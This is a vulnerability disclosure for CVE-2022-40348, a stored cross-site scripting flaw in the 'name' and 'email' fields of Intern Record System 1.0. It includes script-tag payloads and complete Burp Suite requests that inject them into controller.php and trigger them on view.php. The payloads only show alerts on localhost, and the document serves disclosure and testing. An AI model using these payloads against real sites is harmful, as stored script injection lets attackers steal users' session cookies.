# CVE-2022-40348: Intern Record System - 'name' and 'email' Cross-site Scripting (Unauthenticated XSS)
+ **Exploit Title:** Intern Record System - 'name' and 'email' Cross-site Scripting (Unauthenticated XSS)  
+ **Date:** 2022-06-09  
+ **Exploit Author:** Hamdi Sevben  
+ **Vendor Homepage:** https://code-projects.org/intern-record-system-in-php-with-source-code/  
+ **Software Link:** https://download-media.code-projects.org/2020/03/Intern_Record_System_In_PHP_With_Source_Code.zip  
+ **Version:** 1.0  
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53  
+ **CVE:** CVE-2022-40348  

## References:
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40348
+ https://nvd.nist.gov/vuln/detail/CVE-2022-40348

## 1. Description:
Intern Record System 1.0 allows Stored Cross-site Scripting via parameters 'name' and 'email' in "/intern/controller.php". Intern Record System is vulnerable to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data. An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## 2. Proof of Concept:
+ Burpsuite request on 'name' or 'email' parameters with payloads on http://localhost/intern/controller.php
+ Go to http://localhost/intern/view.php page
+ Refresh the page.
+ The XSS will be triggered.
+ Alert will popup.

## 3. Example payload:
+ **Payload-1:** `<script>alert(document.domain)</script>`
+ **Payload-2:** `<script>alert(document.cookie)</script>`

## 4. Burpsuite request on 'name' parameter:  
+ **Injection:**
```
POST /intern/controller.php HTTP/1.1  
Host: localhost  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8  
Accept-Encoding: gzip, deflate  
Accept-Language: en-us,en;q=0.5  
Cache-Control: no-cache  
Content-Length: 78  
Content-Type: application/x-www-form-urlencoded  
Referer: http://localhost/intern/  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36  

name=<script>alert(document.domain)</script>&email=&phone=&deptType=3
```

+ **Identification Page:**
```
GET /intern/view.php HTTP/1.1  
Host: localhost  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8  
Accept-Encoding: gzip, deflate  
Accept-Language: en-us,en;q=0.5  
Cache-Control: no-cache  
Referer: http://localhost/intern/controller.php  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36  
```

## 5. Burpsuite request on 'email' parameter:
+ **Injection:**  
```
POST /intern/controller.php HTTP/1.1  
Host: localhost  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8  
Accept-Encoding: gzip, deflate  
Accept-Language: en-us,en;q=0.5  
Cache-Control: no-cache  
Content-Length: 153  
Content-Type: application/x-www-form-urlencoded  
Referer: http://localhost/intern/  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36  

name=&email=<script>alert(document.cookie)</script>&phone=&deptType=3  
```

+ **Identification Page:**
```
GET /intern/view.php HTTP/1.1  
Host: localhost  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8  
Accept-Encoding: gzip, deflate  
Accept-Language: en-us,en;q=0.5  
Cache-Control: no-cache  
Referer: http://localhost/intern/controller.php  

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36  
```
